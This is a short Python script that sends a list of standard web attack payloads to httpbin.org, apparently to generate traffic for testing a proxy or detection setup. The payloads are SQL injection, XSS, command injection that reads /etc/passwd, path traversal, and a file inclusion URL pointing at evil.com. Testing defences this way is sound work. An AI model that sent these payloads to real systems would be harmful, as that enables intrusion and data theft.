#!/usr/bin/env python3
"""
Simple HTTP Tester
Quick script to generate basic HTTP attack traffic for testing.
"""

import requests
import time

def test_basic_attacks():
    """Send basic attack patterns to httpbin.org for testing."""
    
    # Use httpbin.org as a safe testing target
    base_url = "http://httpbin.org"
    
    # Basic attack patterns
    attacks = [
        # SQL Injection
        ("SQL Injection", "GET", "/get", {"id": "1' OR '1'='1", "user": "admin'--"}),
        ("SQL Injection", "GET", "/get", {"search": "1' UNION SELECT null,null--"}),
        
        # XSS
        ("XSS", "GET", "/get", {"q": "<script>alert('XSS')</script>"}),
        ("XSS", "GET", "/get", {"comment": "<img src=x onerror=alert('XSS')>"}),
        
        # Command Injection
        ("Command Injection", "GET", "/get", {"cmd": "; whoami"}),
        ("Command Injection", "GET", "/get", {"exec": "| cat /etc/passwd"}),
        
        # Directory Traversal
        ("Directory Traversal", "GET", "/get", {"file": "../../../etc/passwd"}),
        ("Directory Traversal", "GET", "/get", {"path": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"}),
        
        # File Inclusion
        ("File Inclusion", "GET", "/get", {"include": "http://evil.com/shell.txt"}),
        ("File Inclusion", "GET", "/get", {"page": "php://input"}),
    ]
    
    print("🧪 Simple HTTP Attack Tester")
    print("=" * 40)
    print(f"🎯 Target: {base_url}")
    print(f"📊 Sending {len(attacks)} attack patterns...")
    print()
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    for i, (attack_type, method, path, params) in enumerate(attacks, 1):
        try:
            url = base_url + path
            print(f"📤 {i:2d}. {attack_type}: {method} {path}")
            print(f"     Params: {params}")
            
            response = session.request(method, url, params=params, timeout=10)
            print(f"📥     Response: {response.status_code} ({len(response.content)} bytes)")
            
            # Small delay between requests
            time.sleep(1)
            
        except Exception as e:
            print(f"❌     Error: {e}")
        
        print()
    
    print("✅ Testing completed!")
    print("📋 If using proxy, check your traffic logs for captured requests.")

if __name__ == "__main__":
    test_basic_attacks()